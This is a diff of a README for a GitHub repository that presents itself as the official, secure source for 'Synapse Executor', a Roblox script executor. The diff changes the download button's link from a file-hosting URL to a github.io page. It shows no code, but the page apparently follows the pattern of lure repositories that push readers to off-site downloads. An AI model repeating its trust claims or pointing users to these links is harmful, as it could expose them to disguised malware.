@@ -1,7 +1,7 @@
 # Official & Secure Download Source for Synapse Executor – The Industry-Leading Roblox Script Executor! 🚀  
 This GitHub repository is the trusted source for downloading Synapse Executor, one of the most powerful and widely-used script executors in the Roblox community. Whether you're a beginner exploring Lua scripting or an experienced developer seeking advanced tools, this is your go-to place to get the latest version of Synapse.
 
-**[![Download Synapse Executor](https://img.shields.io/badge/Download-Synapse%20Executor-blueviolet)](https://downloadifiles.com/?label=1e88dd1be7cebcac3b93ae91dcb2375f)**
+**[![Download Synapse Executor](https://img.shields.io/badge/Download-Synapse%20Executor-blueviolet)](https://synapse-executor-1-roblox-executor.github.io/.github/)**
 
 ✨ **What You'll Find Here:**  
 - **Latest Stable Release**: Always access the newest version of Synapse Executor directly from this repository.  
